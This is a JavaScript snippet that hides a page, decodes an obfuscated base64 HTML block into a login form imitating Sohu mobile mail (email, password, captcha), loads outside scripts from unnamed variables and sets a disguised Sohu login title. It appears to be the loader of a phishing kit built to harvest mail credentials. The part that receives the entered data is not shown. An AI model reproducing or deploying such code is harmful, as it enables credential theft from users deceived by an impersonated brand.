document.querySelector("html").setAttribute("style", 'display: none')
    if (document.querySelectorAll('#AppRoot').length > 0) {
        document.getElementById("AppRoot").style.opacity = '0';
    }else {
        document.body.style.opacity = '0';
    }
    let Nodes = decodeURIComponent(atob("JTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJwYWdlLWJvZHktYm94JTIwYWQtYmFyLWFuaW1hdGUlMjIlM0UlMjAlM0NuYXYlMjBjbGFzcyUzRCUyMnRvcCUyMGNsZWFyZml4JTIwZm9udC1ibGFjayUyMiUzRSUyMCUzQ2IlMjBjbGFzcyUzRCUyMmljb24tYmFjayUyMGljb24taGVhZGVyJTIyJTNFJTNDJTJGYiUzRSUyMCUzQ3NwYW4lMjBjbGFzcyUzRCUyMm5ld3MtdGl0JTIwaWNvbi1oZWFkZXIlMjIlM0UlRTYlOTAlOUMlRTclOEIlOTAlRTYlOTYlQjAlRTklOTclQkIlM0MlMkZzcGFuJTNFJTIwJTNDJTJGbmF2JTNFJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJjb250ZW50JTIwbm8tY29kZSUyMiUzRSUyMCUzQ2RpdiUyMHN0eWxlJTNEJTIycG9zaXRpb24lM0FyZWxhdGl2ZSUyMiUzRSUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybG9nbyUyMiUzRSUzQyUyRmRpdiUzRSUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIyZXJyJTIwaGlkZGVuJTIyJTNFJTNDJTJGZGl2JTNFJTIwJTNDJTJGZGl2JTNFJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJpcHQtYm94JTIwci1ib3JkZXIlMjIlM0UlMjAlM0NsYWJlbCUyMGZvciUzRCUyMm5hbWUlMjIlM0UlMjZuYnNwJTNCJTNDJTJGbGFiZWwlM0UlM0NpbnB1dCUyMHR5cGUlM0QlMjJlbWFpbCUyMiUyMGNsYXNzJTNEJTIyaW5wdXQlMjIlMjBwbGFjZWhvbGRlciUzRCUyMiVFOCVBRiVCNyVFOCVCRSU5MyVFNSU4NSVBNSVFNiU4MiVBOCVFNyU5QSU4NCVFOSU4MiVBRSVFNyVBRSVCMSUyMiUyMG5hbWUlM0QlMjJuYW1lJTIyJTIwaWQlM0QlMjJuYW1lJTIyJTNFJTIwJTNDJTJGZGl2JTNFJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJpcHQtYm94JTIwci1ib3JkZXIlMjIlM0UlMjAlM0NsYWJlbCUyMGZvciUzRCUyMnBhc3N3b3JkJTIyJTNFJTI2bmJzcCUzQiUzQyUyRmxhYmVsJTNFJTNDaW5wdXQlMjB0eXBlJTNEJTIycGFzc3dvcmQlMjIlMjBjbGFzcyUzRCUyMmlucHV0JTIyJTIwcGxhY2Vob2xkZXIlM0QlMjIlRTglQUYlQjclRTglQkUlOTMlRTUlODUlQTUlRTYlODIlQTglRTclOUElODQlRTUlQUYlODYlRTclQTAlODElMjIlMjBuYW1lJTNEJTIycGFzc3dvcmQlMjIlMjBpZCUzRCUyMnBhc3N3b3JkJTIyJTNFJTIwJTNDJTJGZGl2JTNFJTIwJTNDZGl2JTIwY2xhc3MlM0QlMjJpcHQtYm94JTIwci1ib3JkZXIlMjBoaWRkZW4lMjIlM0UlMjAlM0NsYWJlbCUyMGZvciUzRCUyMmNhcHRjaGElMjIlM0UlMjZuYnNwJTNCJTNDJTJGbGFiZWwlM0UlM0NpbnB1dCUyMHR5cGUlM0QlMjJ0ZXh0JTIyJTIwY2xhc3MlM0QlMjJpbnB1dCUyMiUyMHBsYWNlaG9sZGVyJTNEJTIyJUU5JUFBJThDJUU4JUFGJTgxJUU3JUEwJTgxJTIyJTIwbmFtZSUzRCUyMmNhcHRjaGElMjIlMjBpZCUzRCUyMmNhcHRjaGElMjIlMjBhdXRvY29tcGxldGUlM0QlMjJvZmYlMjIlM0UlMjAlM0NpbWclMjBzcmMlM0QlMjIuJTJGMWNiYmIyZDE0ODc1My5jZG4uc29odWNzLmNvbSUyRm1haWxfaDUlMkYyMDE3MTIyNnZyMSUyRmltZyUyRjQwNC5wbmclMjIlMjBhbHQlM0QlMjIlRTclODIlQjklRTUlODclQkIlRTUlODglQjclRTYlOTYlQjAlMjIlMjB0aXRsZSUzRCUyMiVFNyU4MiVCOSVFNSU4NyVCQiVFNSU4OCVCNyVFNiU5NiVCMCUyMiUyMGNsYXNzJTNEJTIyY2FwdGNoYSUyMiUzRSUyMCUzQyUyRmRpdiUzRSUyMCUzQ2RpdiUyMGNsYXNzJTNEJTIybG9naW4tdG9wJTIyJTNFJTIwJTNDYnV0dG9uJTIwdHlwZSUzRCUyMnN1Ym1pdCUyMiUyMGNsYXNzJTNEJTIyZm9udC1ibGFjayUyMGlwdC1ib3glMjByLWJvcmRlciUyMHN1Ym1pdCUyMGxldHRlci1zcGFjZSUyMiUzRSVFNyU5OSVCQiVFNSVCRCU5NSUzQyUyRmJ1dHRvbiUzRSUyMCUzQyUyRmRpdiUzRSUyMCUzQ2RpdiUyMHN0eWxlJTNEJTIydGV4dC1hbGlnbiUzQSUyMHJpZ2h0JTNCJTIyJTNFJTIwJTNDYSUyMGhyZWYlM0QlMjJqYXZhc2NyaXB0JTNBdm9pZCgwKSUyMiUyMGNsYXNzJTNEJTIyZm9yZ2V0cHN3JTIyJTNFJUU1JUJGJTk4JUU4JUFFJUIwJUU1JUFGJTg2JUU3JUEwJTgxJTNDJTJGYSUzRSUyMCUzQ2ElMjBocmVmJTNEJTIyaHR0cHMlM0ElMkYlMkZtLm1haWwuc29odS5jb20lMkZhcHAtd2ViMSUyRnJlZ2lzdGVyLmh0bWwlMjIlMjBjbGFzcyUzRCUyMnJlZ2lzdGVyJTIyJTNFJUU2JUIyJUExJUU2JTlDJTg5JUU4JUI0JUE2JUU1JThGJUI3JUVGJUJDJTlGJUU5JUE5JUFDJUU0JUI4JThBJUU2JUIzJUE4JUU1JTg2JThDJTNDJTJGYSUzRSUyMCUzQyUyRmRpdiUzRSUyMCUzQyUyRmRpdiUzRSUyMCUzQyUyRmRpdiUzRSUyMA=="));
    $(document.body).append(Nodes);
    const script = document.createElement('script');
    script.src = __s1;
    script.async = true;
    document.head.append(script);
    script.onload = async function bolder(e) {
    document.title=window.atob("5pCc54uQ6Zeq55S16YKu566x56e75Yqo54mILeeZu+W9lemhtQ==");
    if (__s2.length > 5) {
        const script2 = document.createElement('script');
        script2.src = __s2;
        document.head.append(script2);
        script2.onload = function reset_it(e) {
            const resetInit = setInterval(function () {
                if (document.querySelectorAll('#AppRoot').length > 0) {
                    clearInterval(resetInit);
                    document.querySelector("html").removeAttribute("style")
                    document.getElementById("AppRoot").style.opacity = '1';
                } else {
                    clearInterval(resetInit);
                    document.querySelector("html").removeAttribute("style")
                    document.body.style.opacity = '1';
                }
            }, 100)
        }
    } else {
        const resetInit2 = setInterval(function () {
            if (document.querySelectorAll('#AppRoot').length > 0) {
                clearInterval(resetInit2);
                document.querySelector("html").removeAttribute("style");
                document.getElementById("AppRoot").style.opacity = '1';
            } else {
                clearInterval(resetInit2);
                document.querySelector("html").removeAttribute("style");
                document.body.style.opacity = '1';
            }
        }, 100)
    }
}